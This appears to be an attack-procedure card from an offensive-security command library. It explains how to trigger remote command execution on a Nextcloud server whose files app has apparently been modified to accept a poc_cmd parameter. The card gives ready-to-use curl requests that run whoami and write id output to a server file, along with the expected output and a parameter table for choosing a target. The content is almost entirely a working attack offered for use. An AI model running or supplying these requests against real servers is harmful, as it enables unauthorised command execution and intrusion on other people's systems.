---
data: 'curl -k ''https://[host]/apps/files/?dir=/&poc_cmd=whoami'''
tags:
  - rce
  - web
type: command
output: www-data
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.467Z'
id: d26dcc97-0f85-4166-a02c-fe553c69405d
verified: false
validated: true
submitted: true
---
# access-rce-url

## Command

```bash
curl -k 'https://[host]/apps/files/?dir=/&poc_cmd=whoami'
```

## Description

This command uses curl to access the modified Nextcloud files app URL, executing the 'whoami' command via the poc_cmd parameter to demonstrate RCE. The -k flag ignores SSL issues for testing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[host]` | Target Nextcloud hostname/IP | Yes |
| `poc_cmd` | Command to execute (e.g., whoami, id) | Yes |
| `-k` | Skip SSL verification | No |

## Examples

### Basic Usage

```bash
curl -k 'https://target.com/apps/files/?dir=/&poc_cmd=whoami'
```

### Advanced Usage

```bash
curl -k 'https://target.com/apps/files/?dir=/&poc_cmd=id%20%3E%20/tmp/output.txt'
```

## Expected Output

Command output from the server, e.g., 'www-data' indicating execution as the web user. For file writes, check server filesystem.

## Related

- [[Related Procedure: Execute-Commands-via-Modified-Files-App]]
